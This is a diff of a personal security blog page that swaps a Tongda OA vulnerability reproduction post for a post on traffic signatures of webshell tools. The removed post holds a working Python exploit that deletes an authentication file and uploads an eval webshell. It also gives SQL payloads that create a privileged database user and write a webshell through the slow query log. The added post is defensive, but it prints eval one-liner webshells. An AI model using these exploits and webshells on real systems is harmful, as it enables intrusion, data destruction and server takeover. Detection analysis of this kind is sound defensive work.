@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>通达OA漏洞 |  unevensails&#39;s blog</title>
+      <title>常见webshell工具流量特征分析 |  unevensails&#39;s blog</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-通达OA漏洞复现"
+  id="post-常见webshell工具流量特征分析"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  通达OA漏洞
+  常见webshell工具流量特征分析
 </h1>
  
 
@@ -73,11 +73,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2022/09/29/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time datetime="2022-09-29T05:22:06.000Z" itemprop="datePublished">2022-09-29</time>
+      <a href="/2022/10/24/%E5%B8%B8%E8%A7%81webshell%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/" class="article-date">
+  <time datetime="2022-10-24T08:35:49.000Z" itemprop="datePublished">2022-10-24</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/OA%E7%B3%BB%E7%BB%9F/">OA系统</a>
+    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
   </div>
   
 <div class="word_count">
@@ -85,7 +85,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">657</span>
+            <span class="post-count">557</span>
         </span>
     </span>
 
@@ -94,38 +94,46 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>通达OA 2013 sql注入<br>漏洞位置 /interface/ugo.php<br>由于单引号被urldecode函数解析了，一个单引号或两个单引号均无变化<br><img src="https://image.3001.net/images/20220927/1664270301_6332bfdd14713d7bdba89.png!small"></p>
-<p>将单引号编码两次，成功绕过<br><img src="https://image.3001.net/images/20220927/1664270411_6332c04b7d950b52726c2.png!small"><br>尝试了一下联合，盲注，都不行，最后用报错注入成功爆出数据库<br><img src="https://image.3001.net/images/20220927/1664270727_6332c187a7cd21894b46e.png!small"><br>通达OA 11.6<br>该漏洞是任意文件删除配合任意文件上传RCE<br>EXP:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target=&quot;http://127.0.0.1/&quot;</span><br><span class="line">payload=&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span><br><span class="line">print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)</span><br><span class="line">input(&quot;Press enter to continue&quot;)</span><br><span class="line">print(&quot;[*]Deleting auth.inc.php....&quot;)</span><br><span class="line"></span><br><span class="line">url=target+&quot;/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php&quot;</span><br><span class="line">requests.get(url=url)</span><br><span class="line">print(&quot;[*]Checking if file deleted...&quot;)</span><br><span class="line">url=target+&quot;/inc/auth.inc.php&quot;</span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line">if &#x27;No input file specified.&#x27; not in page:</span><br><span class="line">    print(&quot;[-]Failed to deleted auth.inc.php&quot;)</span><br><span class="line">    exit(-1)</span><br><span class="line">print(&quot;[+]Successfully deleted auth.inc.php!&quot;)</span><br><span class="line">print(&quot;[*]Uploading payload...&quot;)</span><br><span class="line">url=target+&quot;/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./&quot;</span><br><span class="line">files = &#123;&#x27;FILE1&#x27;: (&#x27;deconf.php&#x27;, payload)&#125;</span><br><span class="line">requests.post(url=url,files=files)</span><br><span class="line">url=target+&quot;/_deconf.php&quot;</span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line">if &#x27;No input file specified.&#x27; not in page:</span><br><span class="line">    print(&quot;[+]Filed Uploaded Successfully&quot;)</span><br><span class="line">    print(&quot;[+]URL:&quot;,url)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-]Failed to upload file&quot;)</span><br></pre></td></tr></table></figure>
+  <h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>菜刀使用的webshell为一句话木马，特征非常明显</p>
+<h5 id="常用一句话"><a href="#常用一句话" class="headerlink" title="常用一句话"></a>常用一句话</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP:    &lt;?php @eval($_POST[&#x27;zopo&#x27;]);?&gt;</span><br><span class="line">ASP:    &lt;%eval request(&quot;zopo&quot;)%&gt;</span><br><span class="line">ASP.NET:  &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;zopo&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
 
-<p>执行EXP<br><img src="https://image.3001.net/images/20220929/1664419192_633505781091dce44d60b.png!small"><br>成功上传一句话木马<br><img src="https://image.3001.net/images/20220929/1664419233_633505a10f2913acf3489.png!small"><br>蚁剑成功连接<br><img src="https://image.3001.net/images/20220929/1664419273_633505c92ba8d05bf0d56.png!small"><br>通达OA 11.7 sql注入<br>漏洞位置 /general/hr/manage/query/delete_cascade.php?condition_cascade<br>判断是否存在sql注入<br>尝试了一下sleep，exp都被过滤了，这里能用power代替</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1=1,1,power(9999,99))</span><br></pre></td></tr></table></figure>
+<h5 id="流量特征："><a href="#流量特征：" class="headerlink" title="流量特征："></a>流量特征：</h5><p>请求包中：ua头为百度爬虫</p>
+<p>请求体中存在<em>eval，base64</em>等特征字符，且传递的payload为base64编码，并且存在固定的<em>QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</em></p>
+<p>请求体中执行结果响应为明文，格式为<em>X@Y，数据，X@Y</em></p>
+<h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>蚁剑的核心代码是由菜刀修改而来的，因此菜刀能用的一句话木马蚁剑也能用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;zopo&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>回显正常<br><img src="https://image.3001.net/images/20220929/1664427547_6335261b6884993ca969c.png!small"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1=1,1,power(9999,99))</span><br></pre></td></tr></table></figure>
-
-<p>回显报错，可证明存在sql注入<br><img src="https://image.3001.net/images/20220929/1664427769_633526f92a34e59ea7739.png!small"><br>添加数据库用户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges ON mysql.* TO &#x27;test111&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;test111@123&#x27; WITH GRANT OPTION</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.3001.net/images/20220929/1664427952_633527b0ab715a9d41722.png!small"><br>成功创建<br><img src="https://image.3001.net/images/20220929/1664428060_6335281c8b1391685bc1b.png!small"><br>给新创建的用户添加权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `mysql`.`user` SET `Password` = &#x27;*5ADFDA524177A8EB24D7671EF80A46F95C68D4ED&#x27;, `Select_priv` = &#x27;Y&#x27;, `Insert_priv` = &#x27;Y&#x27;, `Update_priv` = &#x27;Y&#x27;, `Delete_priv` = &#x27;Y&#x27;, `Create_priv` = &#x27;Y&#x27;, `Drop_priv` = &#x27;Y&#x27;, `Reload_priv` = &#x27;Y&#x27;, `Shutdown_priv` = &#x27;Y&#x27;, `Process_priv` = &#x27;Y&#x27;, `File_priv` = &#x27;Y&#x27;, `Grant_priv` = &#x27;Y&#x27;, `References_priv` = &#x27;Y&#x27;, `Index_priv` = &#x27;Y&#x27;, `Alter_priv` = &#x27;Y&#x27;, `Show_db_priv` = &#x27;Y&#x27;, `Super_priv` = &#x27;Y&#x27;, `Create_tmp_table_priv` = &#x27;Y&#x27;, `Lock_tables_priv` = &#x27;Y&#x27;, `Execute_priv` = &#x27;Y&#x27;, `Repl_slave_priv` = &#x27;Y&#x27;, `Repl_client_priv` = &#x27;Y&#x27;, `Create_view_priv` = &#x27;Y&#x27;, `Show_view_priv` = &#x27;Y&#x27;, `Create_routine_priv` = &#x27;Y&#x27;, `Alter_routine_priv` = &#x27;Y&#x27;, `Create_user_priv` = &#x27;Y&#x27;, `Event_priv` = &#x27;Y&#x27;, `Trigger_priv` = &#x27;Y&#x27;, `Create_tablespace_priv` = &#x27;Y&#x27;, `ssl_type` = &#x27;&#x27;, `ssl_cipher` = &#x27;&#x27;, `x509_issuer` = &#x27;&#x27;, `x509_subject` = &#x27;&#x27;, `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = &#x27;mysql_native_password&#x27;, `authentication_string` = &#x27;&#x27;, `password_expired` = &#x27;Y&#x27; WHERE `Host` = Cast(&#x27;%&#x27; AS Binary(1)) AND `User` = Cast(&#x27;test111&#x27; AS Binary(7));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://image.3001.net/images/20220929/1664428366_6335294eb1502e2f52505.png!small"><br>利用注入点刷新权限<br><img src="https://image.3001.net/images/20220929/1664428440_63352998c24d50b82c311.png!small"><br>写入一句话木马</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">set global slow_query_log=on;</span><br><span class="line">set global slow_query_log_file=&#x27;C:/tongda11.7/webroot/test.php&#x27;;</span><br><span class="line">select &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; or sleep(11);</span><br></pre></td></tr></table></figure>
-
+<h5 id="在使用默认编码器连接时"><a href="#在使用默认编码器连接时" class="headerlink" title="在使用默认编码器连接时"></a>在使用默认编码器连接时</h5><p><img src="https://img-blog.csdnimg.cn/bb1b190d8b324b1b8499613daf7c9e1e.png"><br>请求包的每个请求体都是*@ini_set(“display_errors”, “0”);@set_time_limit(0)*开头，且都存在base64等字符</p>
+<p>响应包的返回格式都为随机数，数据，随机数</p>
+<h5 id="在使用base编码和解码器连接时"><a href="#在使用base编码和解码器连接时" class="headerlink" title="在使用base编码和解码器连接时"></a>在使用base编码和解码器连接时</h5><p><img src="https://img-blog.csdnimg.cn/6de658d49e1f41a9939d799ff83b0df8.png"><br>请求包存在base64加密的eval命令执行</p>
+<p>响应包的返回格式都为随机数，base64加密的数据，随机数</p>
+<h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>冰蝎有自带的冰蝎马，在server文件夹里<br><img src="https://img-blog.csdnimg.cn/eba1ec96a7154c72b90b358c47e2e1e4.png"></p>
+<h4 id="冰蝎2-0"><a href="#冰蝎2-0" class="headerlink" title="冰蝎2.0"></a>冰蝎2.0</h4><p>我的冰蝎2.0找不到了，这里就简单概括一下，2.0中采用的是协商密钥机制。</p>
+<h5 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h5><p>请求中返回包状态码为200，返回内容必定是16位的密钥</p>
+<p>请求体中存在<em>Accept: text/html, image/gif, image/jpeg, *; q=.2, */</em>; q=.2*</p>
+<h5 id="建立连接后"><a href="#建立连接后" class="headerlink" title="建立连接后"></a>建立连接后</h5><p>请求包的coockie格式格式都为<em>Cookie: PHPSESSID=; path=/；</em></p>
+<h4 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h4><h5 id="在使用命令执行功能时"><a href="#在使用命令执行功能时" class="headerlink" title="在使用命令执行功能时"></a>在使用命令执行功能时</h5><p><img src="https://img-blog.csdnimg.cn/558862aa00f346e8838a9604bc8f0956.png"><br>请求包中Content-Length都为5720或5740(不知道为啥我抓的包是5780，可能是java版本问题)存在，且都存在</p>
+<p><em>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9*</p>
+<p><em>Cache-Control: no-cache</em></p>
+<p><em>Pragma: no-cache</em></p>
+<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p>哥斯拉的webshell可以自动生成<br><img src="https://img-blog.csdnimg.cn/2b5dc422e0d94229a693b2bbd6c31c17.png"><br>生成后的PHP木马为普通的一句话木马<br><img src="https://img-blog.csdnimg.cn/ee451b37cf394c3a9e50895aa99496ef.png"></p>
+<h5 id="建立连接后-1"><a href="#建立连接后-1" class="headerlink" title="建立连接后"></a>建立连接后</h5><p><img src="https://img-blog.csdnimg.cn/88af8a8594274db69f354d8d3738af8a.png"><br>请求包中的cookie末尾都有;特征，且都存在<em>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/</em>;q=0.8*</p>
+<p>响应包中都存在<em>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</em></p>
  
       <!-- reward -->
       
@@ -190,12 +198,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://unevensails.github.io/2022/09/29/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://unevensails.github.io/2022/10/24/%E5%B8%B8%E8%A7%81webshell%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
 
     </footer>
   </div>
@@ -203,19 +211,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2022/10/24/%E5%B8%B8%E8%A7%81webshell%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            常见webshell工具流量特征分析
-          
-        </div>
-      </a>
     
-    
-      <a href="/2022/09/08/vulnhub--jboss/" class="article-nav-link">
+      <a href="/2022/09/29/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">vulnhub--jboss</div>
+        <div class="article-nav-title">通达OA漏洞</div>
       </a>
     
   </nav>
